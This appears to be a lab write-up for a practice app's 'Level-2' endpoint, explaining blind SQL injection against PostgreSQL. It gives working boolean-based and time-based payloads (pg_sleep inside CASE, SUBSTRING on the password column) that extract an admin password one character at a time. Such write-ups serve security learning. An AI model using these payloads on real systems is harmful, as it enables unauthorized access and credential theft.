## Level-2

Target Route: 

```
/users/level2?username=<payload>
```
ID parameters accepts a string. Example:

```
This:
/users/level2?username=admin

Returns:
This user exists in the system.

And this:
/users/level2?username=notauser
This user does not exist in the system.
```

Take a careful look at the response. The responses do not show anything technical - only vague answer of whether a user exists or not.

Vulnerabilities applicaple (primary ones only):

1. Boolean-Based Blind
2. Time-Based Blind

### Payload Explaination

What I thought while solving this was we can simply use an AND clause with a conditional and then execute a sleep function to delay responses. Example:

```
/users/level2?username=admin' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```

This will make SQL hang for exactly five seconds. But when I used this, it did not work.

The reason it did not work is because this payload was half incomplete. In MySQL, SLEEP(5) returns 0 which is an integer and MySQL evaluates in an AND clause. But in Postgres, `pg_sleep()` returns void which basically translates to `WHERE username='admin' AND void`. Since AND requires both side to be true, it crashed the server.

To fix this, we must ensure that `pg_sleep()` returns something. Updated payload:

```
/users/level2?username=admin' AND 1=(SELECT CASE WHEN (1=1) THEN (SELECT 1 FROM pg_sleep(5)) ELSE 1 END)--
```

So this payload has three steps:

1. `(SELECT 1 FROM pg_sleep(5))` executes the 5-second sleep, but instead of returning `void`, it returns the number `1`.
2. `CASE` statement will evaluate the condition 1=1 and because it is true, it will trigger the sleep and outputs `1`.
3. Outer query now sees `AND 1=1` which evaluates to TRUE.

### Guessing the password

In Postgres, `SUBSTRING(password,1,1)` evaluates the password column and extracts the first character. We can use this to evaluate each character of a password one by one to get the whole password.

### Guessing via Boolean

```
This payload:
username=admin' AND SUBSTRING(password, 1, 1) = 'A'--

Returns:
"User does not exists"

This payload:
admin' AND SUBSTRING(password, 1, 1) = 'S'--

Returns:
"User exists"
```

The latter worked because the first letter of the admin's password is 'S' and the query evaluated to true.

### Guessing via Time-based

We take the same logic from above but instead, we can ask the server to sleep if it is true else return immediately.

```
This payload:
username=admin' AND 1=(SELECT CASE WHEN (SUBSTRING(password, 1, 1)='A') THEN (SELECT 1 FROM pg_sleep(5)) ELSE 1 END)--

Returns:
Response immediately.

While this payload:
username=admin' AND 1=(SELECT CASE WHEN (SUBSTRING(password, 1, 1)='S') THEN (SELECT 1 FROM pg_sleep(5)) ELSE 1 END)--

Returns:
Response after five second delay.
```

An attacker can simply automate this and repeat until entire string is extracted.

Blind SQLi is slower and creates a lot of logs, but it is a powerful exploit.